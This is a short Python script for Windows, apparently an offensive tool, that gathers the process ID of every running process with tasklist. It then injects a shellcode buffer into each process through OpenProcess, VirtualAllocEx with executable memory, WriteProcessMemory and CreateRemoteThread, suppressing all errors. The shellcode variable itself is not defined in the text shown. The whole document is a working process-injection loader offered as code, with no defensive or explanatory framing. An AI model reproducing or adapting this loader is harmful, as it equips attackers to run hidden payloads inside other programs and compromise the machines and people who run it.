from ctypes import*
from subprocess import*

k = windll.kernel32

cmd = 'tasklist /FO list'
pids = []
a = Popen(cmd, shell=True, stdout=PIPE).stdout.readlines()

for l in a:
	if l.startswith('PID'):
		pids.append(int(l.split()[-1]))

 


scLen = len(shellcode)

for p in pids:
	try:
		h = k.OpenProcess(0x1F0FFF, False, int(p))
		v = k.VirtualAllocEx(h, 0, scLen, 0x00001000, 0x40)
		k.WriteProcessMemory(h, v, shellcode, scLen, 0)
		k.CreateRemoteThread(h, None, 0, v, 0,0,0)
	except Exception as e:
		pass #print(e)